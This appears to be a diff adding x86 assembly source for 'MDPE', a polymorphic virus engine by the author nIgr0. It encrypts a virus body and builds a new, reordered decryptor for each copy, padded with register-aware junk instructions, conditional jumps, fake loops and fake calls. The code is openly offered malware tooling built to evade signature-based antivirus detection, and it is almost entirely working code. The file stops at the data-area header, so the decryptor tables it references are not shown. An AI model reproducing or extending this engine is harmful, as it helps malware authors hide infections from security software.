@@ -1,0 +1,1445 @@
+;*************************************************************
+;*                                                           *
+;*      MDPE    (MULTY DECRIPTOR POLY ENGINE)                *
+;*      Poly Engine de 32 bits   by nIgr0                    *
+;*                                                           *
+;*************************************************************
+; PARAMETROS:
+;          EDI = buffer donde se guardar  el virii encriptado
+;          ESI = Offset a la zona a encriptar
+;          ECX = Tama¤o a encriptar/4
+;          EBX = Load Adress del archivo infectado
+;          EBP = El delta offset
+;
+; Devuelve ECX = Tama¤o del virii con la nueva rutina de encriptaci¢n
+;
+;
+;     This poly has been commented in Spanish for that i've decided
+;     to do a little explanation in Engish.
+;     Here You have my last poly engine , it hasnt emulation but
+;     it cant be upgrated with new decriptors ,updating a data
+;     structure that is at the end of the poly.
+;     The poly look for a decriptor to generate in the data structure
+;     ,reordenate it and generate garbage for it.
+;     The garbage wont modify decriptor registers because the poly
+;     will know the registers used by the decriptor (with a mask data)
+;     and wont modify it.
+;     Otherwise it can generate garbage that modifies that registers
+;
+;     Using :  generate push register
+;              change mask_data_for_this_register
+;              generate garbage  (that could use this register)
+;              restore mask_data_value 
+;              generate pop register
+;
+;     The reordenation of the decriptor needs a data structure called
+;     dependency table , in every entry of this table are the 
+;     number of the instructions that have to be generated before the
+;     instruction that correspond with the entry.
+;     With this information the poly can generate a new decriptor
+;     changing the instructions order.
+;     But it has a little problem, because  in the decriptor there are instructions
+;     of the type jz salto, o push offset_salto , these instructions
+;     needs a realocation proccess that is carried by a relocation data
+;     structure, with the  number of instructions that need relocation
+;     and the number of the instruction where the execution will jump.
+;     This relocation structure must to be modified by the poly while
+;     it is generating a new reordenated decriptor, because the number
+;     of instructions will change.
+;
+;     The poly has fields unused to manage uninitialized registers,
+;     and registers that have been modified by an operation.
+;     These fields need and emulation process unimplemented by that could
+;     be implemented in new released of the engine.
+;
+;
+;                       nIgr0
+
+
+.386p
+.model flat,STDCALL
+
+extrn      ExitProcess:PROC
+extrn      MessageBoxA:PROC        ;apis exportadas unicamente en la primera
+extrn      CreateProcessA:proc     ;generaci¢n
+extrn      GetComputerNameA:proc
+
+buffersize  equ  offset end - offset start + 01000h
+
+.data
+
+text1    db    'Nigr0_lives_here!!!',0
+text2    db    'Probando Poly Engine de 32 bits',0
+.code
+
+inicio:       pushad
+start:        popad
+              int   3h
+
+              call  getdelta
+getdelta:     pop  ebp
+              sub  ebp,offset getdelta
+
+              lea   edi,[ebp+end]             ;LLAMO AL POLY ENGINE
+              lea   esi,[ebp+start]
+              mov   ecx,((offset end-offset start)/4)+1
+              lea   ebx,[ebp+end]
+              call  Engine
+              int   3h
+              lea   eax,ebp+end
+              jmp   eax              ;probando el decriptor
+                
+              push  0ffh
+              call  ExitProcess
+
+;******************************************************************
+;*                        Poly Engine                             *
+;******************************************************************
+
+Engine:
+       pushad
+
+       jmp  firmapoly
+       db   ' MDPE (Multy Decriptor Poly Engine) by nIgr0 ',0
+firmapoly:
+
+       call Initvariables
+
+       call InitSemilla       ;inicializo la semilla
+
+       call ElijeDec          ;elije un decriptor para encriptar
+                              ;en ESI el puntero a la estructura del
+                              ;decriptor
+       call GeneraDec         ;Genera la rutina de desencriptacion
+
+       call CopioCuerpoDelVirus ;Copia el cuerpo del virus al final del 
+                                ;decriptor
+       call EncriptoCuerpoDelVirus ;Y ahora lo encripta
+
+
+       mov  eax,dword ptr [ebp+startbody]
+       mov  edi,dword ptr [ebp+startbufaddrparam]
+       mov  ecx,dword ptr [ebp+sizeparam]
+       sal  ecx,2
+       add  eax,ecx
+       sub  eax,edi
+       sar  eax,2            ;divido entre 4
+       inc  eax
+       mov  ebx,esp
+       mov  dword ptr [ebx+24],eax    ;guardo en la pila el nuevo tama¤o
+       popad
+
+       ret
+
+startbody dd 0h
+
+;**** Inicializo variables del Decriptor ******************
+Initvariables:
+       pushad
+       xor eax,eax
+       mov dword ptr [ebp+startencaddrparam],esi      ;Guardo los parametros
+       mov dword ptr [ebp+startbufaddrparam],edi      ;Pasados al poly
+       mov dword ptr [ebp+sizeparam],ecx
+       mov dword ptr [ebp+loadaddrparam],ebx
+
+       lea  edi,[ebp+off_a_rutinas]
+       mov  ecx,40
+       rep  stosd       ;pongo a 0 las tablas para la generacion de rutinas
+
+       popad
+       ret
+
+
+;**** Encripto el Cuerpo del Virus llamando a la rutina de encriptacion *****
+EncriptoCuerpoDelVirus:
+      mov  dword ptr [ebp+startbody],edi
+      mov  esi,dword ptr [ebp+startdiraenc]
+      mov  dword ptr [esi],edi                 ;Pongo la direccion del cuerpo
+                                               ;del virus en el encriptor
+      call dword ptr [ebp+encaddr]             ;llamo al encriptor
+      ret
+
+
+;**** Copio el Cuerpo del Virus al buffer donde se encriptara *******
+CopioCuerpoDelVirus:                        ;Entrada: EDI puntero al final
+       push edi                                     ;     del decriptor
+       mov esi,dword ptr [ebp+startencaddrparam]
+       mov ecx,dword ptr [ebp+sizeparam]
+       rep movsd                         ;copio el virus al buffer
+       pop edi
+       ret
+
+;***** Inicializo los valores del Decriptor y el Encriptor ***********
+
+InicializaDecEnc:                 ;Entrada: ESI puntero a estructura SRD
+                                          ; ECX tama¤o a encriptar
+                                  ;Salida:  ESI comienzo de la zona de opcodes
+                                          ; ECX numero de instrucciones del
+                                          ;     decriptor
+        call leepuntero
+        mov dword ptr [eax],ecx   ;Guardo el tama¤o en el decriptor
+        call leepuntero
+        mov dword ptr [eax],ecx
+        
+        xor  eax,eax
+        dec  eax
+        call numaleatorio         ;Guardo tambien el num aleatorio
+        xchg ebx,eax
+        call leepuntero
+        mov dword ptr [eax],ebx   ;Meto el valor aleatorio en el decriptor
+        call leepuntero           ;y en el encriptor
+        mov dword ptr [eax],ebx
+        call leepuntero
+        mov dword ptr [ebp+startdiraenc],eax
+        lodsb
+        mov byte ptr [ebp+regini],al
+        lodsb
+        mov byte ptr [ebp+regbloq],al
+        lodsb
+        mov byte ptr [ebp+regopera],al
+        lodsd
+        xchg eax,ecx          ;En ecx devuelvo el numero de instrucciones
+                              ;a generar
+        call leepuntero
+        mov dword ptr [ebp+encaddr],eax ;Guardo la direccion de la rutina
+                                        ;de encriptacion en la variable
+                                        ;encaddr
+
+        call leepuntero
+        mov dword ptr [ebp+addrtabladep],eax  ;guardo la direccion de la
+                                              ;tabla de dependencias
+                                              ;para reordenar el decriptor
+
+        lodsd
+        mov dword ptr [ebp+mascarareord],eax  ;Guardo la mascara de
+                                              ;reordenacion
+        call leepuntero
+        xchg eax,ebx          ;en ebx devuelvo un puntero a la estructura
+                              ;reloc del decriptor
+        call leepuntero
+        xchg eax,esi          ;Y en esi el comienzo de la estructura de
+                              ;opcodes
+        ret
+
+leepuntero:
+         lodsd
+         add eax,ebp
+         ret
+
+
+;********** Mete Instruccion Basura *********************
+MeteBasura:
+       push esi               ;apilo esi para no perder el puntero
+                              ;a la instruccion a insertar
+       push ebx
+       push ecx
+
+       mov eax,07h              ;5 instrucciones basura como maximo
+       call numaleatorio
+       xchg eax,ecx
+       inc  ecx
+otrainstruccion:
+       push ecx
+
+       call Mete_una_ins_basura
+
+       pop ecx
+       dec ecx
+       jnz otrainstruccion
+
+       pop  ecx
+       pop  ebx
+       pop  esi
+       ret
+
+;******** Rutina que llama a un procedimiento de generacion de basura ******
+Mete_una_ins_basura:
+       mov  eax,dword ptr [ebp+tiposbasura]
+       call numaleatorio
+       lea  esi,[ebp+tablabasuras]
+       add  eax,eax
+       add  eax,eax
+       add  esi,eax
+       lodsd          ;en eax el puntero a la funcion que generara
+                      ;el tipo de instruccion basura
+       call eax       ;LLamo al generador de basura especifico
+       ret
+
+
+;********** Mete Otra instruccion del decriptor *********
+MeteInstruccion:                      ;Entrada: ESI puntero a la instruccion
+                                      ;         EDI puntero a la posicion que
+                                      ;             tendra la ins en el buffer
+                                      ;Salida:  ESI puntero a la siguiente
+                                      ;             instruccion
+                                      ;         EDI se incrementara con el
+                                      ;             tama¤o de la instruccion
+       push ecx
+       push ebx
+
+       xor  eax,eax
+       lodsb      ;en eax tendre el tama¤o de la instruccion
+       xchg eax,ecx
+
+       lodsb
+       or byte ptr [ebp+regini],al   ;Realizo la mascara de bits 
+                                     ;Para saber en cada momento los registros
+                                     ;que ya han sido inicializados
+       rep movsb
+
+       pop  ebx
+       pop  ecx
+
+       ret
+
+
+;*************** Reordeno el Decriptor ********************************
+ReordenaDec:                            ;Entrada EBX= Estructura de realocacion
+                                        ;        ESI= Estructura de opcodes        
+                                        ;        ECX= Numero de Instrucciones
+                                        ;             del decriptor
+                                        ;Salida  EBX= Nueva estructura
+                                        ;             de realocacion
+                                        ;        ESI= Nueva estructura de opcodes
+                
+       pushad
+       mov  dword ptr [ebp+newdecorder],ecx
+       mov  dword ptr [ebp+ninstrucciones],ecx
+       mov  dword ptr [ebp+ebxtemp],ebx
+
+       push esi
+       push ecx
+       mov esi,ebx                     ;copio la estructura reloc
+       lea edi,[ebp+estructreloc]      ;a una nueva zona ya que la voy
+       mov ecx,8                       ;a modificar
+       rep movsd
+       pop ecx
+       pop esi
+
+       lea edi,[ebp+DECRIPTOR]
+       push esi
+       mov  edx,ecx
+       push edx
+
+mas:   cmp dword ptr [ebp+mascarareord],0
+       je  salirRD
+       pop eax        ;en eax el numero de intrucciones del decriptor
+       pop esi        ;en esi el comienzo de la estructura de decriptors
+       push esi
+       push eax
+       call numaleatorio      ;Obtengo un numero de instruccion
+       xchg eax,ecx
+       call busca_mascara
+       and edx,dword ptr [ebp+mascarareord]
+       cmp edx,0
+       je  mas          ;Si ya se la he puesto busco otra instruccion.
+                        ;En ecx el numero de la instruccion (la primera es 0)
+       call verificadependencias
+       cmp edx,-1
+       je  mas       ;Si hay dependencias no realizadas busco otra instruccion
+
+       call metoinsdec   ;inserto una instruccion en el nuevo decriptor
+       jmp mas
+salirRD:
+       pop eax
+       pop eax
+       popad
+
+       lea esi,[ebp+DECRIPTOR]      ;ESI apunta ahora al nuevo decriptor
+       lea ebx,[ebp+estructreloc]   ;EBX apunta a la nueva estructura
+                                    ;    de realocacion
+       ret
+
+verificadependencias:
+       push esi
+       push ecx
+
+       xor  edx,edx
+       mov  esi,dword ptr [ebp+addrtabladep]
+       mov  eax,016d
+       mul  cl
+       add  esi,eax        ;esi apunta a una entrada en la tabla de
+                           ;dependencias
+
+  otradep:
+       xor  eax,eax
+       lodsb
+       cmp  al,0
+       je   nohaydependencias
+       xchg eax,ecx
+       dec  ecx
+       call busca_mascara
+       and  edx,dword ptr [ebp+mascarareord]
+       cmp  edx,0
+       je   otradep
+       mov  edx,-1   ;codigo de error hay depencias
+
+  nohaydependencias:
+       pop  ecx
+       pop  esi
+       ret
+
+
+metoinsdec:
+       call cambiarelocations
+
+       call busca_mascara
+       xor  dword ptr [ebp+mascarareord],edx  ;marco la instruccion como ya
+                                              ;insertada
+   
+       xor  ebx,ebx
+nextins:
+       cmp  ebx,ecx
+       je   insencontrada
+       xor  eax,eax
+       lodsb
+       inc  esi
+       add  esi,eax
+
+       inc  ebx         ;paso a la siguiente instruccion del decriptor
+       jmp  nextins
+
+insencontrada:
+       xor  eax,eax
+       lodsb
+       stosb
+       xchg eax,ecx
+       inc  ecx
+       rep  movsb
+       ret
+
+cambiarelocations:
+       pushad
+       mov  ebx,dword ptr [ebp+ebxtemp]
+       mov  eax,dword ptr [ebp+ninstrucciones]
+       mov  edx,dword ptr [ebp+newdecorder]
+       lea  edi,[ebp+estructreloc]
+       sub  eax,ecx
+       
+       cmp  eax,dword ptr [ebx]
+       jne  ot1
+       mov  dword ptr [edi],edx
+
+  ot1: cmp  eax,dword ptr [ebx+4]
+       jne  ot2
+       mov  dword ptr [edi+4],edx
+
+  ot2: cmp  eax,dword ptr [ebx+8]
+       jne  ot3
+       mov  dword ptr [edi+8],edx
+
+  ot3: dec dword ptr [ebp+newdecorder]
+       popad
+       ret
+
+ebxtemp     dd 0h      ;Guardo temporalmente ebx con el valor del puntero
+                       ;a la reloc estructure
+ninstrucciones dd 0h   ;Numero de instrucciones del decriptor
+newdecorder dd 0h      ;Este es el numero de instruccion por la que vamos
+                       ;dentro del nuevo decriptor
+                       ;Por motivos de dise¤o:
+                       ;Va decreciendo a medida que nos acercamos al final
+                       ;con lo que 1 sera el numero de
+                       ;instruccion de la ultima instruccion.
+
+;*************** Genera el Decriptor ***********************************
+                                       ;Entrada: ESI puntero a estructura
+                                       ;         de datos del decriptor
+                                       ;Salida: EDI direccion del final
+GeneraDec:                                    ;     del decriptor
+
+         call InicializaDecEnc
+
+         call ReordenaDec            ;Reordeno el Decriptor
+
+         mov edi,dword ptr [ebp+startbufaddrparam] ;Inicializo EDI con el
+                                                   ;Valor del Buffer
+         mov  al,060h
+         stosb           ;meto un pushad antes del decriptor
+
+otrainst:
+
+         call MeteBasura
+
+         call VerificaRelocs
+
+         call MeteInstruccion
+
+         dec ecx
+         jnz otrainst
+
+         call MeteBasura         ;meto un poco mas de basura :)
+
+         xor  ecx,ecx
+
+         call VerificaRelocs     ;Verifico relocs con ecx=0 por si hay saltos
+                                 ;al final del decriptor
+         call ModificaRelocs 
+
+         call Crearllamadasaproc
+       ret
+
+;*********** Genero las llamadas a procedimientos **************************
+Crearllamadasaproc:
+       pushad
+
+       xor  ecx,ecx
+       lea  esi,[ebp+off_a_rutinas]
+       lodsd
+       or   eax,eax
+       je   salircllp           ;Si no hay rutinas generadas salgo fuera
+max:
+       inc  ecx
+       lodsd
+       or   eax,eax
+       je   vamosaporelcall
+       jmp  max
+
+vamosaporelcall:
+       lea  esi,[ebp+off_a_llamadas]
+
+genero_call:                    ;en ecx tengo el numero de rutinas generadas
+       mov  eax,ecx
+       call numaleatorio        ; elijo una llamada
+       add  eax,eax
+       add  eax,eax
+       lea  ebx,[ebp+off_a_rutinas]
+       add  ebx,eax
+       mov  edx,dword ptr [ebx]   ;en edx la direccion de la rutina
+
+       lodsd
+       or   eax,eax
+       je   salircllp
+       add  eax,04h
+       sub  edx,eax
+       mov  dword ptr [eax-4h],edx  ;llamada generada
+
+       jmp  genero_call
+
+salircllp:
+       popad
+       ret
+
+;*** Modifica Relocs para que los saltos se realicen a direcciones correctas *************
+ModificaRelocs:
+       pushad
+       mov eax,dword ptr [ebp+startdiradec]
+       
+       sub edi,dword ptr [ebp+startbufaddrparam]
+       add edi,dword ptr [ebp+loadaddrparam]
+
+       mov dword ptr [eax],edi          ;inserto la direccion correcta de enc
+                                        ;en el decriptor
+       cmp dword ptr [ebx+4],00h
+       je  norelabs
+       mov ecx,dword ptr [ebp+destinosaltoabs]
+       mov eax,dword ptr [ebp+origensaltoabs]
+       sub ecx,dword ptr [ebp+startbufaddrparam]
+       add ecx,dword ptr [ebp+loadaddrparam]
+       mov dword ptr [eax],ecx          ;modifico el salto absoluto
+norelabs:
+       cmp dword ptr [ebx+8],00h
+       je norelrel
+       mov ecx,dword ptr [ebp+origensaltorel]
+       inc ecx
+       mov eax,dword ptr [ebp+destinosaltorel]
+       sub eax,ecx
+       dec ecx
+       mov byte ptr [ecx],al             ;modifico el salto relativo
+norelrel:
+       popad
+       ret
+
+;************** Verifica Relocs ********************************
+                                        ;Entrada: EBX puntero a la estructura
+VerificaRelocs:                         ;         de realocacion del dec.
+                                        ;         EDI puntero a la instruccion
+                                        ;         que necesita realocacion
+         pushad                         ;         ECX el numero de instruccion
+         cmp ecx,dword ptr [ebx]
+         jne otraR1
+         mov eax,edi
+         add eax,dword ptr [ebx+12]
+         mov dword ptr [ebp+startdiradec],eax
+
+otraR1:  cmp ecx,dword ptr [ebx+4]
+         jne otraR2
+         mov eax,edi
+         add eax,dword ptr [ebx+16]
+         mov dword ptr [ebp+origensaltoabs],eax
+
+otraR2:  cmp ecx,dword ptr [ebx+8]
+         jne otraR3
+         mov eax,edi
+         add eax,dword ptr [ebx+20]
+         mov dword ptr [ebp+origensaltorel],eax
+
+otraR3:  cmp ecx,dword ptr [ebx+24]
+         jne otraR4
+         mov dword ptr [ebp+destinosaltoabs],edi
+
+otraR4:  cmp ecx,dword ptr [ebx+28]
+         jne otraR5
+         mov dword ptr [ebp+destinosaltorel],edi
+otraR5:
+         popad
+         ret
+
+;*************** Elije un decriptor **************************************
+                                        ;en ESI devuelve un puntero a la
+                                        ;estructura SRD
+ElijeDec:
+       mov eax,dword ptr [ebp+numdec];
+       call numaleatorio
+       lea esi,[ebp+tabladec]
+       add eax,eax
+       add eax,eax
+       add esi,eax
+       lodsd
+       add  eax,ebp
+       xchg eax,esi
+       ret
+
+;*************** Inicializo la Semilla para el Slow Poly *****************
+
+InitSemilla:                        
+       pushad
+
+       sidt  qword ptr [ebp+idt]
+       xor   ebx,ebx
+       mov   dword ptr [ebp+semilla],ebx
+       mov   dword ptr [ebp+lastsemilla],ebx
+       mov   bx,word ptr [ebp+idt_limit]
+       mov   esi,dword ptr [ebp+idt_addr]
+       mov   cl,03h
+       ror   bx,cl
+otrovalor:
+       lodsd
+       add   dword ptr [ebp+semilla],eax
+       dec   ebx
+       jnz   otrovalor
+
+;       mov   eax,dword ptr [ebp+nombrecomp]
+;       mov   dword ptr [ebp+semilla],eax
+;       mov   eax,dword ptr [ebp+nombrecomp+4h]
+;       mov   dword ptr [ebp+lastsemilla],eax
+       popad
+       ret
+
+idt:
+idt_limit    dw 00h
+idt_addr     dd 00h
+
+;***************** Devuelve un valor entre 0 - (eax - 1) *************
+numaleatorio:   push ebx              ;Entrada: Eax el limite del valor alea
+                push edx              ;         a generar
+                xchg eax,ebx          ;Salida: Eax numero generado.
+                call genaleatorio
+                xor  edx,edx
+                div  ebx
+                xchg eax,edx
+                pop edx
+                pop ebx
+                ret
+
+;******** Genera N£meros pseudoAleatorios a partir de la semilla *******
+
+genaleatorio:
+             push ebx
+             push ecx
+             mov eax, dword ptr [ebp+semilla]    ; EAX = semilla
+             test eax, 80000000h     ; is bit31 = [0] or [1] ?
+             jz @@FALSE              ;
+@@TRUE:      xor eax, 57h            ; [1] XOR bits 6, 4, 2, 1, and 0   
+@@FALSE:     rol eax, 1              ; [0] & [1] rol  
+             mov dword ptr [ebp+semilla], eax    ; semilla = EAX                       
+             pop  ecx
+             pop  ebx
+             ret                   ;en eax devuelve el valor aleatorio
+
+semilla      dd 00h
+lastsemilla  dd 00h
+nombrecomp   db 'nIgr0istheking!'
+variable     dd  016d
+
+;**************** Inserta Basura Nop ***************************
+mete_nop:
+        mov al,090h                   ;Inserta un Nop como basura
+        stosb
+        ret
+
+;********** Mete Mov inmediato por el decriptor ************
+mete_mov_inmediato:
+
+        call obtengo_reg_aleatorio
+        call Init_al_bl
+        call verifbloq
+        or  dl,dl
+        je  noestabloq
+        jmp mete_mov_inmediato ;Solo sale cuando el registro esta bloqueado
+noestabloq:              ;y esta bloqueado
+        mov al,0b8h         ;opcode de un mov eax,0
+        add al,cl
+        stosb               ;copio el opcode
+
+;        mov dl,01h
+;        rol dl,cl
+;        or  byte ptr [ebp+regini],dl      ;modifico el byte de registros
+                                          ;inicializados
+        xor  eax,eax
+        dec  eax
+        call numaleatorio
+        stosd               ;y ahora copio el inmediato
+salirmmi:
+        ret
+
+;******* Mete mov con un inmediato de un byte **************************
+mete_mov_byte_inmediato:
+        mov eax,04h
+        call numaleatorio
+        xchg eax,ecx
+        call Init_al_bl
+        call verifbloq
+        or  dl,dl
+        je  noestabloq3
+        jmp salirmmbi
+noestabloq3:              ;Si no esta bloqueado
+        mov eax,02h
+        call numaleatorio
+        or  eax,eax
+        jne noincrementar
+        mov al,0b0h
+        jmp seg
+noincrementar:
+        mov al,0b4h
+seg:    add al,cl
+        stosb               ;copio el opcode
+
+;       mov dl,01h
+;       rol dl,cl
+;       or  byte ptr [ebp+regini],dl      ;modifico el byte de registros
+                                          ;inicializados
+        mov eax,0ffh
+        call numaleatorio
+        stosb               ;y ahora copio el inmediato
+salirmmbi:
+        ret
+
+;***** Inicializo registros a 0 con xor reg,reg o sub reg,reg  *********
+a_cero_con_xor_sub:
+
+        call obtengo_reg_aleatorio
+
+        call Init_al_bl  ;inicializo al y bl con el valor de regini y regbloq
+
+        call verifbloq
+        or   dl,dl
+        je  noestabloq2
+
+        jmp salirmmi2    ;Solo sale cuando el registro esta inicializado
+noestabloq2:             ;y esta bloqueado
+        mov  eax,02h
+        call numaleatorio   ;SI devuelve 1 mete un sub  si devuelve 0 un xor
+        cmp  eax,1
+        je   mete_sub
+        mov al,033h         ;opcode de un xor
+        jmp  mete_op
+mete_sub:
+        mov al,02bh
+mete_op:stosb               ;copio el opcode
+        lea esi,[ebp+tabla_xor]
+        add esi,ecx
+        lodsb
+        stosb              ;copio el byte a memoria
+
+ ;      mov dl,01h
+ ;      rol dl,cl
+ ;      or  byte ptr [ebp+regini],dl      ;modifico el byte de registros
+                                          ;inicializados
+salirmmi2:
+        ret
+
+tabla_xor:
+        db 0c0h  ;xor eax,eax
+        db 0c9h  ;    ecx,ecx
+        db 0d2h  ;    edx,edx
+        db 0dbh  ;    ebx,ebx
+        db 0e0h  ;    esp,esp
+        db 0edh  ;    ebp,ebp
+        db 0ffh  ;    edi,edi
+        db 0f6h  ;    esi,esi
+
+;******* Meto instrucciones Basura Push Pop ***************************
+mete_push_pop:
+        cmp  dword ptr [ebp+profundidad],2h
+        jae  salirmpp
+
+        call obtengo_reg_aleatorio
+        mov  al,050h
+        add  al,cl
+        stosb            ;inserto el push
+        inc dword ptr [ebp+profundidad]
+        call  MeteBasura       ;mete basura entre el push y el pop
+        dec dword ptr [ebp+profundidad]
+
+cojootroregistro:
+        call obtengo_reg_aleatorio
+        call Init_al_bl
+        call verifbloq
+        cmp  dl,0
+        je   insertar_pop
+        jmp cojootroregistro
+
+insertar_pop:
+        mov  eax,058h
+        add  eax,ecx
+        stosb               ;inserto el pop
+
+;       mov dl,01h
+;       rol dl,cl
+;       or byte ptr [ebp+regini],dl         ;el registro del pop ya estara
+                                            ;inicializado
+salirmpp:
+        ret
+
+;********* Introduce instrucciones de incremento y decremento ***********
+mete_inc_dec:
+        call obtengo_reg_aleatorio
+        call Init_al_bl
+        call verifbloq
+        cmp  dl,0
+        jne  mete_inc_dec
+
+        mov  eax,02h
+        call numaleatorio
+        cmp  eax,0h
+        je   metedec
+meteinc: mov al,040h
+         jmp meteopid
+metedec: mov al,048h
+meteopid:add al,cl    ;obtengo el opcode correcto sumando el numero de registro
+         stosb
+salirmid:
+        ret
+
+;******* Mete saltos condicionales ***********************************
+mete_salto_condicional:
+        cmp  dword ptr [ebp+profundidad],2h
+        jae  salirmsc
+
+        mov  eax,00fh
+        call numaleatorio
+        xchg eax,ebx
+        mov  al,00fh
+        stosb
+        mov  al,080h
+        add  eax,ebx
+        stosb
+        stosd
+        push edi
+        inc dword ptr [ebp+profundidad]
+        call  MeteBasura       
+        dec dword ptr [ebp+profundidad]
+        pop  esi
+        mov eax,esi
+        mov ebx,edi
+        sub esi,4h
+        sub ebx,eax
+        mov dword ptr [esi],ebx       ;relleno el valor del salto condiconal
+salirmsc:
+        ret
+;********* Se encarga de meter instrucciones ror o rol ,inmediato ********
+mete_rotacion_inm:
+        call obtengo_reg_aleatorio
+        call Init_al_bl
+        call verifbloq
+        or   dl,dl
+        jne  mete_rotacion_inm
+        mov  al,0c1h
+        stosb
+        add  cl,0c0h
+        xchg eax,ecx
+        stosb
+        mov  eax,032h
+        call numaleatorio
+        stosb
+        ret
+
+;******** Mete Comparacion Registro Registro ,seguido de un salto cond *****
+mete_comparacion_reg_reg:
+        mov   al,03bh
+        stosb               ;mete el opcode un un cmp reg,reg
+        call obtengo_reg_aleatorio
+        mov  ebx,0ch
+        mov  eax,04h
+        call numaleatorio
+        add  eax,ebx
+        rol eax,4h
+        add al,cl
+        stosb           
+        call mete_salto_condicional
+        ret
+;****** Mete instrucciones add adc sub sbb and con un inm de 1 byte *******
+mete_add_adc_sub_sbb_or_and_inm:
+        mov  al,083h
+        stosb               ;meto el opcode general de todas ellas
+
+        mov  ebx,0ch
+        mov  eax,03h
+        call numaleatorio
+        add  eax,ebx
+        rol eax,4h
+        push eax
+busca_otro_reg:
+        call obtengo_reg_aleatorio
+        call Init_al_bl
+        call verifbloq
+        or  dl,dl
+        jne  busca_otro_reg     ;busco un registro no bloqueado
+
+        xor  eax,eax
+        inc  eax
+        call numaleatorio
+        or   eax,eax
+        je   saltito
+        add cl,08h
+saltito:
+        pop  eax
+
+        add  eax,ecx
+        stosb                ;completo la instruccion
+        xor  eax,eax
+        dec  eax
+        call numaleatorio
+        stosb                ;meto el inmediato
+
+        ret
+
+;******* Mete bucle con contador descendiente ************************
+mete_bucle_cont_des:
+        cmp  dword ptr [ebp+profundidad],2h
+        jae  salirmbcd
+
+        call obtengo_reg_aleatorio
+        call Init_al_bl
+        call verifbloq
+        cmp  dl,0
+        jne  mete_bucle_cont_des       ;busco un registro no bloqueado
+        call busca_mascara
+        xor  dword ptr [ebp+regbloq],edx     ;bloqueo el registro
+                                             ;que voy a utilizar como contador
+        push  edx
+
+        mov  al,0b8h
+        add  al,cl
+        stosb           
+        mov  eax,010h
+        call numaleatorio
+        stosd                ;inserto instruccion mov regcontador,inmediato
+        push edi
+        inc dword ptr [ebp+profundidad]
+        call  MeteBasura       
+        dec dword ptr [ebp+profundidad]
+        pop   ebx
+        pop   edx
+        xor  dword ptr [ebp+regbloq],edx
+
+        mov   al,048h
+        add   al,cl
+        stosb          ;meto instruccion dec regcontador
+
+        mov   al,074h
+        stosb
+        mov   eax,edi
+        inc   eax
+        sub   ebx,eax
+        xchg  eax,ebx
+        stosb          ;meto el je otro_mas
+
+salirmbcd:
+        ret
+
+;**** Mete Mov reg,reg ******************************************************
+mete_mov_reg_reg:
+        call obtengo_reg_aleatorio
+        call Init_al_bl
+        call verifbloq
+        or   dl,dl
+        jne  mete_mov_reg_reg
+
+        mov  al,08bh
+        stosb             ;meto el opcode de un mov reg,reg
+
+        mov  eax,08h
+        mul  cl
+        add  eax,0c0h
+        xchg ebx,eax
+        mov  eax,08h
+        call numaleatorio
+        add  eax,ebx
+        stosb
+        ret
+
+;*** Mete procedimientos y se guarda su entry_point para poder resolver llamadas ***
+mete_rutina:
+        cmp  dword ptr [ebp+profundidad],2h
+        jae  salirmr
+
+        mov   ecx,9
+        lea   esi,[ebp+off_a_rutinas]
+otra_ent:
+        lodsd
+        or    eax,eax
+        je    encontrado_hueco
+        dec   ecx
+        jne   otra_ent
+        jmp   salirmr
+encontrado_hueco:
+        sub   esi,04h
+        mov   eax,edi
+        add   eax,5h
+        mov   dword ptr [esi],eax     ;guardo en la tabla el entry_point
+                                      ;de la funcion
+
+        mov al,0e9h  ;meto el opcode de un jmp
+        stosb
+        stosd        ;y ahora el inmediato
+        push edi
+
+        mov dword ptr [ebp+nocalls],1           ;deshabilito calls
+        inc dword ptr [ebp+profundidad]         ;para evitar bucles infinitos
+        call  MeteBasura       
+        dec dword ptr [ebp+profundidad]
+        xor eax,eax
+        mov dword ptr [ebp+nocalls],eax         ;habilito calls
+
+        mov al,0c3h
+        stosb              ;meto el ret 
+
+        mov ebx,edi
+        pop eax
+        sub ebx,eax
+        sub eax,04h
+        mov dword ptr [eax],ebx     ;completo el jmp esquivar_proc
+
+salirmr:
+        ret
+;******** Inserta llamadas a procedimientos ****************************
+mete_call:                              ;Realmente solo reserva huecos
+                                        ;para el salto ya que puede saltar
+                                        ;a procedimientos que haya antes
+                                        ;o despues del call
+
+        cmp   dword ptr [ebp+nocalls],0h
+        jne   salirmc
+
+        mov   ecx,29
+        lea   esi,[ebp+off_a_llamadas]
+otra_ent2:
+        lodsd
+        or    eax,eax
+        je    encontrado_hueco2
+        dec   ecx
+        jne   otra_ent2
+        jmp   salirmc
+encontrado_hueco2:
+        mov   al,0e8h                 ;opcode de un call realtivo
+        stosb
+        sub   esi,04h
+        mov   dword ptr [esi],edi     ;guardo la direccion de inmediato
+        xor   eax,eax                 ;en la tabla
+        stosd                         ;meto hueco para el inmediato
+salirmc:
+        ret
+;**** Desbloquea temporalmente algun registro bloqueado *******************
+;**** Para poder generar basura con registros bloqueados ******************                        
+debloquea_reg:
+        cmp  dword ptr [ebp+profundidad],2h
+        jae  salirdr
+
+        call obtengo_reg_aleatorio
+        call Init_al_bl
+        call verifbloq
+        or   dl,dl
+        je   mete_mov_reg_reg
+
+        mov  al,050h
+        add  al,cl
+        stosb            ;inserto el push
+        call busca_mascara
+        xor  dword ptr [ebp+regbloq],edx    ;desbloqueo registro
+        push edx
+        push ecx         ;apilo el registro
+        inc dword ptr [ebp+profundidad]
+        call  MeteBasura       ;mete basura entre el push y el pop
+        dec dword ptr [ebp+profundidad]
+        pop  ecx
+        pop  edx
+        xor  dword ptr [ebp+regbloq],edx     ;lo vuelvo a bloquear
+
+insertar_pop2:
+        mov  eax,058h
+        add  eax,ecx
+        stosb               ;inserto el pop
+
+
+
+salirdr:
+        ret
+
+
+;**** En cl recibo el numero del registro y devuelve en edx la mascara ******
+busca_mascara:
+        xor   edx,edx
+        inc   edx
+        rol   edx,cl
+        ret
+
+;******* Inicializo al y bl con los valores de regbloq y regini *******
+Init_al_bl:
+        mov al,byte ptr [ebp+regbloq]   ;en al el byte con registros bloqueados
+        mov bl,byte ptr [ebp+regini]    ;en bl el byte con registros inicializados
+        ret
+
+;****** Verifica si un registro indicado en cl esta bloquedado *******
+verifbloq:
+        call busca_mascara
+        and dl,al
+        ret
+
+;******* Verifica si un registro indicado en cl a sido inicializado ******
+verifini:
+        call busca_mascara
+        and dl,bl
+        ret
+
+;************* Obtiene un registro aleatorio ******************+
+                                                ;En ECX el numero que
+obtengo_reg_aleatorio:                          ;representa ese registro
+
+otronumero:
+        mov eax,07h
+        call numaleatorio
+        xchg eax,ecx
+
+        cmp ecx,4h              ;No trabajo con el registro esp
+        je otronumero
+
+        ret
+
+;************** Zona de datos pa el engine *********************
+
